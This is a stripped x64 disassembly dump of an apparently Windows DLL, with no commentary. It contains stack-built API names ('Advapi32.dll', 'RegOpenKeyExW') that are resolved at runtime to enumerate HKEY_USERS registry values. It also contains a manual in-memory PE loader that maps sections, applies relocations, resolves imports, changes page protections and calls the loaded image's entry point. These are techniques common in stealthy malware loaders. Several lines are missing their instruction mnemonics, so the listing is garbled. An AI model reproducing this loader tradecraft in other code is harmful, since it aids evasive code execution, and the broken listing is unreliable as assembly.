call j_sub_18001c80c
mov [ rbp + 0x40 ] 0x7
mov [ rbp + 0x38 ] rbx
mov [ rbp + 0x28 ] bx
cmp [ rbp - 0x38 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x28 ]
call j_sub_18001c80c
mov [ rbp - 0x38 ] 0x7
mov [ rbp - 0x40 ] rbx
mov [ rbp - 0x50 ] bx
cmp [ rbp - 0x10 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x50 ]
call j_sub_18001c80c
mov [ rbp - 0x10 ] 0x7
mov [ rbp - 0x18 ] rbx
mov [ rbp - 0x28 ] bx
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_18001c80c
mov [ rsp + 0x78 ] 0x7
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x60 ] bx
cmp [ rbp + 0x68 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov rcx r12
call sub_18001c80c
mov rcx rsi
call sub_18001c80c
nop
mov rax rdi
mov rcx [ rbp + 0x170 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x280 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call j_sub_18001c80c
sub_1800124b0
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x58 ] rsi
mov rdi rcx
lea rax [ r--data ]
mov [ rcx ] rax
mov rbx [ rcx + 0x48 ]
test rbx rbx
je r-xdata
mov rcx [ rdi + 0x40 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_18000b260
mov rcx rbx
call j_sub_18001c80c
lea rcx [ rdi + 0x198 ]
call sub_18001c294
nop
cmp [ rdi + 0x188 ] 0x8
jb r-xdata
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
nop
mov [ rdi + 0x188 ] 0x7
xor esi esi
mov [ rdi + 0x180 ] rsi
mov [ rdi + 0x170 ] si
cmp [ rdi + 0x160 ] 0x8
jb r-xdata
mov rcx [ rdi + 0x170 ]
call j_sub_18001c80c
mov [ rdi + 0x160 ] 0x7
mov [ rdi + 0x158 ] rsi
mov [ rdi + 0x148 ] si
cmp [ rdi + 0x138 ] 0x8
jb r-xdata
mov rcx [ rdi + 0x148 ]
call j_sub_18001c80c
mov [ rdi + 0x138 ] 0x7
mov [ rdi + 0x130 ] rsi
mov [ rdi + 0x120 ] si
cmp [ rdi + 0x110 ] 0x8
jb r-xdata
mov rcx [ rdi + 0x120 ]
call j_sub_18001c80c
mov [ rdi + 0x110 ] 0x7
mov [ rdi + 0x108 ] rsi
mov [ rdi + 0xf8 ] si
cmp [ rdi + 0xe8 ] 0x8
jb r-xdata
mov rcx [ rdi + 0xf8 ]
call j_sub_18001c80c
mov [ rdi + 0xe8 ] 0x7
mov [ rdi + 0xe0 ] rsi
mov [ rdi + 0xd0 ] si
mov rcx [ rdi + 0xb0 ]
test rcx rcx
je r-xdata
mov rcx [ rdi + 0xd0 ]
call j_sub_18001c80c
mov [ rdi + 0xb0 ] rsi
mov [ rdi + 0xb8 ] rsi
mov [ rdi + 0xc0 ] rsi
lea rbx [ rdi + 0x80 ]
mov [ rsp + 0x48 ] rbx
mov rcx rbx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] rsi
lea rcx [ rdi + 0x50 ]
call sub_180010cb0
mov rcx [ rdi + 0x50 ]
call j_sub_18001c80c
mov [ rdi + 0x50 ] rsi
lea rax [ r--data ]
mov [ rdi ] rax
lea rbx [ rdi + 0x10 ]
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] rsi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
call j_sub_18001c80c
sub_1800126a0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x48 ]
sub rsp 0x120
mov [ rbp - 0x70 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x10 ] rax
mov r14 rcx
mov [ rbp - 0x10 ] 0x61766441
mov [ rbp - 0xc ] 0x32336970
mov [ rbp - 0x8 ] 0x6c6c642e
mov [ rbp - 0x4 ] 0x0
lea rcx [ rbp - 0x10 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov [ rbp ] 0x4f676552
mov [ rbp + 0x4 ] 0x4b6e6570
mov [ rbp + 0x8 ] 0x78457965
mov [ rbp + 0xc ] 0x57
lea rdx [ rbp ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
lea rcx [ rbp - 0x10 ]
call [ LoadLibraryA@IAT ]
test rax rax
je r-xdata
mov rcx [ rbp + 0x10 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x120 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
lea rdx [ r14 + 0xd0 ]
cmp [ rdx + 0x18 ] 0x8
jb r-xdata
lea rcx [ rsp + 0x68 ]
mov [ rsp + 0x20 ] rcx
mov r9d 0xf003f
xor r8d r8d
mov rcx 0xffffffff80000003
call rax
test eax eax
jne r-xdata
mov rdx [ rdx ]
xor esi esi
mov [ rsp + 0x58 ] rsi
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x48 ] rsi
lea rax [ rsp + 0x74 ]
mov [ rsp + 0x40 ] rax
lea rax [ rsp + 0x60 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rsi
xor r9d r9d
xor r8d r8d
xor edx edx
mov rcx [ rsp + 0x68 ]
call [ RegQueryInfoKeyW@IAT ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x68 ]
call [ RegCloseKey@IAT ]
mov r15d [ rsp + 0x74 ]
inc r15d
mov r13d r15d
add r13 r13
mov rcx r13
call sub_18001d820
mov r12 rax
mov edi esi
cmp [ rsp + 0x60 ] esi
jbe r-xdata
mov rcx r12
call sub_18001c80c
mov r8 r13
xor edx edx
mov rcx r12
call sub_18001c9f0
mov [ rsp + 0x70 ] r15d
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rsi
mov [ rsp + 0x20 ] rsi
lea r9 [ rsp + 0x70 ]
mov r8 r12
mov edx edi
mov rcx [ rsp + 0x68 ]
call [ RegEnumValueW@IAT ]
test eax eax
jne r-xdata
inc edi
cmp edi [ rsp + 0x60 ]
jb r-xdata
lea r8 [ rsp + 0x78 ]
lea rdx [ r--data ]
mov rcx r12
call sub_18001d7e8
mov ecx 0x30
call sub_18001c84c
mov [ rbp - 0x68 ] rax
test rax rax
je r-xdata
mov rbx rsi
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov [ rbp - 0x48 ] 0x7
mov [ rbp - 0x50 ] rsi
mov [ rbp - 0x60 ] si
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x60 ]
call sub_180001ac0
mov rcx [ r14 + 0x40 ]
mov rax [ rcx ]
mov r8d [ rsp + 0x78 ]
lea rdx [ rbp - 0x60 ]
call [ rax + 0x10 ]
mov rbx rax
mov rdx rax
mov rcx [ r14 + 0x48 ]
call sub_18000b550
mov rsi rax
test rbx rbx
je r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0xc
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp - 0x38 ]
mov rcx rbx
call sub_1800092e0
nop
test rbx rbx
je r-xdata
test rsi rsi
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbp - 0x80 ] rax
mov [ rbp - 0x78 ] rax
mov rdx rsi
lea rcx [ rbp - 0x80 ]
call sub_1800034c0
nop
lea rcx [ r14 + 0x80 ]
lea rdx [ rbp - 0x80 ]
call sub_180011df0
nop
mov rcx [ rbp - 0x78 ]
test rcx rcx
je r-xdata
jmp r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
cmp [ rbp - 0x20 ] 0x8
jb r-xdata
[ rcx + 0x8 ]
jne r-xdata
xor esi esi
mov rcx [ rbp - 0x38 ]
call j_sub_18001c80c
mov rbx [ rbp - 0x78 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rbp - 0x78 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
sub_1800129e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_1800124b0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_180012a20
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov [ rsp + 0x88 ] rsi
mov rsi rcx
xor edi edi
mov [ rsp + 0x80 ] edi
mov rax [ rcx ]
mov r8d r8d
call [ rax + 0x68 ]
mov r13 rax
test rax rax
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ rdi + 0x28 ]
call sub_18001c84c
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x78 ]
mov rsi [ rsp + 0x88 ]
add rsp 0x50
pop r13
pop r12
pop rdi
retn
mov rbx rdi
mov rcx rax
call sub_1800132d0
mov rbx rax
jmp r-xdata
test rbx rbx
je r-xdata
mov rax [ r12 ]
lea rdx [ rsp + 0x28 ]
mov rcx r12
call [ rax + 0x30 ]
nop
movzx edx [ rsp + 0x28 ]
test dx dx
je r-xdata
mov [ rsp + 0x70 ] rbx
mov rdx r13
mov rcx rbx
call sub_180013320
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x80 ]
mov r12 rax
mov rax [ rax ]
mov rdx r13
mov rcx r12
call [ rax + 0x50 ]
test al al
je r-xdata
mov rax [ r12 ]
mov edx 0x1
mov rcx r12
call [ rax ]
mov r8 [ rsi ]
mov rdx r13
mov rcx rsi
call [ r8 + 0x70 ]
nop
mov rcx rbx
call sub_1800132f0
mov rcx rbx
call j_sub_18001c80c
lea rcx [ rsp + 0x30 ]
call sub_180002680
test edi edi
jne r-xdata
mov rcx rsi
call sub_1800102e0
cmp eax 0xffffffff
setne al
test al al
jne r-xdata
mov rdx r12
mov rcx rbx
call sub_1800133a0
movzx edx [ rsp + 0x28 ]
mov rcx rbx
call sub_180013340
mov dl 0x1
mov rcx rbx
call sub_1800133c0
mov dl 0x35
mov rcx rbx
call sub_180013380
lea rcx [ rsi + 0xb0 ]
lea rdx [ rsp + 0x70 ]
call sub_180010fd0
movzx edi [ rsp + 0x28 ]
mov [ rsp + 0x80 ] edi
mov rbx [ rsp + 0x70 ]
sub_180012c00
lea rax [ r--data ]
mov [ rcx + 0x8 ] 0x0
mov [ rcx ] rax
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x20 ] rax
mov [ rcx + 0x28 ] rax
mov [ rcx + 0x30 ] rax
mov [ rcx + 0x48 ] rax
mov [ rcx + 0x50 ] rax
mov [ rcx + 0x38 ] rax
mov [ rcx + 0x40 ] rax
mov rax rcx
retn
sub_180012c40
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x48 ] rsi
mov [ rsp + 0x50 ] rdi
mov rax rcx
xor ebx ebx
mov rcx rdx
call [ rax + 0x18 ]
mov rdi rax
test rax rax
je r-xdata
mov rax rbx
jmp r-xdata
mov rsi [ rax + 0x8 ]
mov edx 0x1
mov rcx rsi
call sub_18001d210
mov r12 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
mov r9 rsi
mov r8 [ rdi ]
mov rdx rsi
mov rcx rax
call sub_18001d25c
mov ecx 0x10
call sub_18001c84c
test rax rax
je r-xdata
mov [ rax ] r12
mov [ rax + 0x8 ] rsi
mov rbx rax
sub_180012d30
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov rbx rdx
mov rdi rcx
xor eax eax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov r8 [ rdx + 0x8 ]
mov rdx [ rdx ]
test r8 r8
je r-xdata
lea rcx [ rsp + 0x28 ]
call [ rdi + 0x10 ]
movzx edi al
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
movzx eax dil
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
mov rdx [ rbx ]
mov rcx rbx
call [ rdx ]
[ rbx + 0xc ]
jne r-xdata
lea rcx [ rsp + 0x28 ]
call sub_1800011a0
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
jmp r-xdata
sub_180012de0
mov r11 rsp
mov [ r11 + 0x10 ] rdx
push rbp
push rsi
push rdi
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov rbp rcx
mov [ r11 + 0x8 ] 0x0
movzx eax [ rdx ]
mov [ rsp + 0x28 ] ax
movzx eax [ rdx + 0x2 ]
mov [ rsp + 0x2a ] al
movzx eax [ rdx + 0x3 ]
mov [ rsp + 0x2b ] al
lea rsi [ rdx + 0x8 ]
mov rdx rsi
lea rcx [ r11 - 0x38 ]
call sub_180002700
lea rdx [ rsp + 0x70 ]
lea rcx [ rsp + 0x28 ]
call sub_1800099d0
mov rdi rax
call [ GetProcessHeap@IAT ]
mov rcx rax
mov r8 [ rsp + 0x70 ]
mov edx 0x8
call [ HeapAlloc@IAT ]
mov rbx rax
mov rdx [ rsp + 0x70 ]
mov r9 rdx
mov r8 rdi
mov rcx rax
call sub_18001d25c
mov rcx rdi
call sub_18001c80c
mov rdx [ rsp + 0x70 ]
mov rcx rbx
call [ rbp + 0x40 ]
movzx ebx al
mov rcx rsi
call sub_180002680
movzx eax bl
mov rbx [ rsp + 0x80 ]
add rsp 0x50
pop rdi
pop rsi
pop rbp
retn
sub_180012ea0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax rcx
xor ecx ecx
mov rdi rdx
mov [ rsp + 0x30 ] ecx
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x30 ]
call [ rax + 0x38 ]
mov r8 [ rsp + 0x30 ]
mov rcx rdi
mov rdx rax
mov rbx rax
call sub_180009ed0
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
mov rbx [ rsp + 0x38 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_180012fe0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
xor ebx ebx
mov [ rsp + 0x40 ] rbx
call [ rcx + 0x48 ]
mov rdi rax
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov edx 0x1
mov rcx [ rax + 0x20 ]
call sub_18001d210
mov rsi rax
test rax rax
je r-xdata
mov rax rbx
jmp r-xdata
mov rdx [ rdi + 0x20 ]
mov r9 rdx
mov r8 [ rdi + 0x18 ]
mov rcx rax
call sub_18001d25c
mov ecx 0x28
call sub_18001c84c
mov r11 rax
test rax rax
je r-xdata
mov r10 [ rdi + 0x20 ]
movzx r9d [ rdi + 0x10 ]
mov r8d [ rdi + 0xc ]
movzx edx [ rdi + 0xa ]
movzx ecx [ rdi + 0x8 ]
mov [ rax ] rbx
mov [ rax + 0x8 ] cx
mov [ rax + 0xa ] dl
mov [ rax + 0xc ] r8d
mov [ rax + 0x10 ] r9b
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] r10
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp r10 0x200000
cmova ecx eax
mov [ r11 + 0x11 ] cl
mov rbx r11
sub_1800130c0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x68 ] rsi
mov rbx rdx
mov rdi rcx
mov [ rsp + 0x60 ] 0x0
lea rsi [ rsp + 0x28 ]
xor eax eax
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
mov r8 [ rdx + 0x8 ]
mov rdx [ rdx ]
test r8 r8
je r-xdata
mov rcx rsi
call [ rdi + 0x40 ]
movzx esi al
mov [ rsp + 0x60 ] al
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
movzx eax sil
jmp r-xdata
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
lea r9d [ rax + 0x1 ]
[ r8 + 0x8 ] r9d
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x40
pop rdi
retn
mov rdx [ rbx ]
mov rcx rbx
call [ rdx ]
[ rbx + 0xc ]
jne r-xdata
mov rcx rsi
call sub_1800011a0
mov rdx [ rbx ]
mov rcx rbx
call [ rdx + 0x8 ]
sub_180013180
push rbx
sub rsp 0x20
lea rax [ r--data ]
mov rbx rcx
lea rdx [ rsp + 0x30 ]
mov [ rcx ] rax
add rcx 0x10
call sub_180001960
xor r11d r11d
lea rax [ r--data ]
mov [ rbx ] rax
mov [ rbx + 0x8 ] r11d
mov [ rbx + 0x40 ] r11
mov rax rbx
mov [ rbx + 0x48 ] r11
mov [ rbx + 0x60 ] r11
mov [ rbx + 0x50 ] r11
mov [ rbx + 0x58 ] r11
mov [ rbx + 0x68 ] r11
mov [ rbx + 0x70 ] r11
add rsp 0x20
pop rbx
retn
sub_1800131e0
push rbx
sub rsp 0x20
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
[ rbx + 0x8 ]
mov [ rsp + 0x30 ] rdi
jne r-xdata
mov rdi [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180013220
push rbx
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
lea rax [ r--data ]
mov [ rcx ] rax
lea rbx [ rcx + 0x10 ]
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] 0x0
add rsp 0x30
pop rbx
retn
sub_180013260
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov edi edx
mov rsi rcx
lea rax [ r--data ]
mov [ rcx ] rax
lea rbx [ rcx + 0x10 ]
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_180004840
nop
mov rcx [ rbx ]
call j_sub_18001c80c
mov [ rbx ] 0x0
test dil 0x1
je r-xdata
mov rax rsi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rsi
call j_sub_18001c80c
sub_1800133e0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push r12
push r13
push r14
sub rsp 0x20
mov rax [ r8 ]
mov r13 [ r8 + 0x8 ]
xor esi esi
mov r12 rdx
movzx edx [ rax + 0x14 ]
mov rbp r8
mov r14 rcx
cmp si [ rax + 0x6 ]
jae r-xdata
mov rbp [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov [ rsp + 0x48 ] rdi
lea rdi [ rdx + rax + 0x28 ]
mov [ rsp + 0x40 ] rbx
mov ecx [ rdi - 0x4 ]
mov rdx rax
mov r9d 0x4
add rcx r13
mov r8d 0x1000
call [ VirtualAlloc@IAT ]
mov edx [ rdi + 0x4 ]
mov r8d [ rdi ]
add rdx r14
mov rcx rax
mov rbx rax
call sub_18001c4a0
mov [ rdi - 0x8 ] ebx
movsxd rax [ r12 + 0x38 ]
test eax eax
jle r-xdata
mov eax [ rdi ]
test eax eax
jne r-xdata
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rax [ rbp ]
inc esi
add rdi 0x28
movzx ecx [ rax + 0x6 ]
cmp esi ecx
jl r-xdata
mov ecx [ rdi - 0x4 ]
mov r9d 0x4
mov r8d 0x1000
mov rdx rax
add rcx r13
mov rbx rax
call [ VirtualAlloc@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
mov [ rdi - 0x8 ] eax
call sub_18001c9f0
jmp r-xdata
sub_1800134d0
push rbp
push rsi
push rdi
sub rsp 0x20
mov r8 [ rcx ]
mov rbp rcx
mov rcx 0xffffffff00000000
mov rsi [ r8 + 0x30 ]
movzx eax [ r8 + 0x14 ]
xor edi edi
and rsi rcx
cmp di [ r8 + 0x6 ]
jae r-xdata
add rsp 0x20
pop rdi
pop rsi
pop rbp
retn
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] r12
lea r12 [ rw-data ]
lea rbx [ rax + r8 + 0x3c ]
nop [ rax + rax ] ax
movsxd rcx eax
movsxd rax edx
lea rdx [ rax + rcx * 2 ]
lea rcx [ r10 + rdx * 2 ]
mov r10d [ r12 + rcx * 4 ]
bt r9d 0x1a
jae r-xdata
mov ecx [ rbx - 0x1c ]
mov edx [ rbx - 0x14 ]
mov r8d 0x4000
or rcx rsi
call [ VirtualFree@IAT ]
jmp r-xdata
mov eax [ rbx - 0x14 ]
test eax eax
jne r-xdata
bts r10d 0x9
mov r8 [ rbp ]
inc edi
add rbx 0x28
movzx eax [ r8 + 0x6 ]
cmp edi eax
jl r-xdata
mov ecx [ rbx - 0x1c ]
lea r9 [ rsp + 0x40 ]
mov edx eax
or rcx rsi
mov r8d r10d
call [ VirtualProtect@IAT ]
test r9b 0x40
je r-xdata
mov r9d [ rbx ]
mov eax r9d
mov edx r9d
mov r10d r9d
shr eax 0x1d
shr edx 0x1e
shr r10d 0x1f
and eax 0x1
and edx 0x1
bt r9d 0x19
jae r-xdata
mov r12 [ rsp + 0x50 ]
mov rbx [ rsp + 0x48 ]
test r9b r9b
jns r-xdata
mov eax [ r8 + 0x20 ]
jmp r-xdata
mov eax [ r8 + 0x24 ]
test eax eax
je r-xdata
sub_1800135e0
mov [ rsp + 0x8 ] rbx
mov rax [ rcx ]
mov rbx [ rcx + 0x8 ]
mov r11 rdx
cmp [ rax + 0xb4 ] 0x0
jbe r-xdata
mov rbx [ rsp + 0x8 ]
xor eax eax
retn
mov r8d [ rax + 0xb0 ]
add r8 rbx
mov eax [ r8 ]
test eax eax
je r-xdata
mov eax 0x1
mov rbx [ rsp + 0x8 ]
retn
nop [ rax ] eax
mov eax [ r8 + 0x4 ]
add r8 rax
mov eax [ r8 ]
test eax eax
jne r-xdata
nop [ rax ] eax
mov r10d eax
mov eax [ r8 + 0x4 ]
xor edx edx
sub rax 0x8
add r10 rbx
lea r9 [ r8 + 0x8 ]
test rax 0xfffffffffffffffe
jbe r-xdata
movsxd rax ecx
add [ rax + r10 ] r11d
cmp eax 0xa
jne r-xdata
movzx eax [ r9 ]
mov ecx eax
shr eax 0xc
and ecx 0xfff
cmp eax 0x3
je r-xdata
mov ecx [ r8 + 0x4 ]
inc edx
add r9 0x2
sub rcx 0x8
mov eax edx
shr rcx 0x1
cmp rax rcx
jb r-xdata
movsxd rax ecx
add [ rax + r10 ] r11
jmp r-xdata
sub_1800136a0
push rsi
push r13
sub rsp 0x28
mov rax [ rcx ]
mov r13 [ rcx + 0x8 ]
mov rsi rcx
cmp [ rax + 0x94 ] 0x0
jbe r-xdata
mov eax 0x1
add rsp 0x28
pop r13
pop rsi
retn
mov [ rsp + 0x48 ] rbp
mov ebp [ rax + 0x90 ]
mov edx 0x14
add rbp r13
mov rcx rbp
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
mov rbp [ rsp + 0x48 ]
add rsp 0x28
pop r13
pop rsi
retn
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x50 ] rdi
mov [ rsp + 0x58 ] r12
mov [ rsp + 0x20 ] r14
mov r14 0x8000000000000000
mov eax 0x1
jmp r-xdata
mov rdx [ rsi + 0x40 ]
lea rcx [ r13 + rax ]
call [ rsi + 0x28 ]
mov r12 rax
test rax rax
je r-xdata
mov r12 [ rsp + 0x58 ]
mov rdi [ rsp + 0x50 ]
mov rbx [ rsp + 0x40 ]
mov r14 [ rsp + 0x20 ]
mov rbp [ rsp + 0x48 ]
add rsp 0x28
pop r13
pop rsi
retn
mov ecx 0x7e
jmp r-xdata
mov ecx [ rsi + 0x18 ]
inc ecx
movsxd rdx ecx
mov rcx [ rsi + 0x10 ]
shl rdx 0x3
call sub_18001da9c
test rax rax
je r-xdata
call [ SetLastError@IAT ]
xor eax eax
mov rdx [ rsi + 0x40 ]
mov rcx r12
call [ rsi + 0x38 ]
mov ecx 0xe
jmp r-xdata
movsxd rcx [ rsi + 0x18 ]
mov [ rsi + 0x10 ] rax
mov [ rax + rcx * 8 ] r12
inc [ rsi + 0x18 ]
mov eax [ rbp ]
test eax eax
je r-xdata
mov ebx [ rbp + 0x10 ]
add rbx r13
mov rdi rbx
mov edi [ rbp + 0x10 ]
lea rbx [ r13 + rax ]
add rdi r13
jmp r-xdata
add rbp 0x14
mov edx 0x14
mov rcx rbp
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
sub rdi rbx
nop [ rax ] eax
mov rax [ rbx ]
test rax rax
je r-xdata
mov eax [ rbp + 0xc ]
test eax eax
je r-xdata
call [ rsi + 0x30 ]
mov [ rdi + rbx ] rax
test rax rax
je r-xdata
lea rdx [ rax + r13 + 0x2 ]
mov rdx [ rsi + 0x40 ]
mov rcx r12
call [ rsi + 0x38 ]
mov ecx 0x7f
mov rax [ rbx + 0x8 ]
add rbx 0x8
test rax rax
jne r-xdata
mov r8 [ rsi + 0x40 ]
mov rcx r12
movzx edx ax
test r14 rax
jne r-xdata
sub_180013870
sub rsp 0x28
mov rax [ rcx ]
mov r8 [ rcx + 0x8 ]
cmp [ rax + 0x8c ] 0x0
je r-xdata
mov ecx 0x7f
call [ SetLastError@IAT ]
xor eax eax
add rsp 0x28
retn
mov eax [ rax + 0x88 ]
mov ecx [ rax + r8 + 0x14 ]
test ecx ecx
je r-xdata
cmp edx ecx
ja r-xdata
sub edx [ rax + r8 + 0x10 ]
mov eax [ rax + r8 + 0x1c ]
lea rcx [ r8 + rax ]
mov eax [ rcx + rdx * 4 ]
add rax r8
add rsp 0x28
retn
sub_1800138d0
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
xor esi esi
mov rbx rcx
cmp [ rcx + 0x1c ] esi
je r-xdata
cmp [ rbx + 0x10 ] rsi
je r-xdata
mov rax [ rbx ]
mov rcx [ rcx + 0x8 ]
xor r8d r8d
mov r9d [ rax + 0x28 ]
xor edx edx
add r9 rcx
call r9
mov [ rbx + 0x1c ] esi
mov rcx [ rbx + 0x8 ]
mov rsi [ rsp + 0x30 ]
test rcx rcx
je r-xdata
cmp [ rbx + 0x18 ] esi
jle r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
add rsp 0x20
pop rbx
xor edx edx
mov r8d 0x8000
call [ VirtualFree@IAT ]
mov rcx [ rbx + 0x10 ]
call sub_18001c80c
mov [ rsp + 0x38 ] rdi
mov rdi rsi
nop [ rax ] eax
inc esi
add rdi 0x8
cmp esi [ rbx + 0x18 ]
jl r-xdata
mov rdx [ rbx + 0x40 ]
mov rcx [ rdi + rcx ]
call [ rbx + 0x38 ]
mov rcx [ rbx + 0x10 ]
cmp [ rdi + rcx ] 0x0
je r-xdata
mov rdi [ rsp + 0x38 ]
sub_180013990
push rbx
push r12
push r13
push r14
sub rsp 0x28
mov eax 0x5a4d
mov rbx r9
mov r13 r8
mov r14 rdx
mov r12 rcx
cmp [ rcx ] ax
je r-xdata
mov [ rsp + 0x58 ] rsi
movsxd rsi [ rcx + 0x3c ]
add rsi rcx
cmp [ rsi ] 0x4550
jne r-xdata
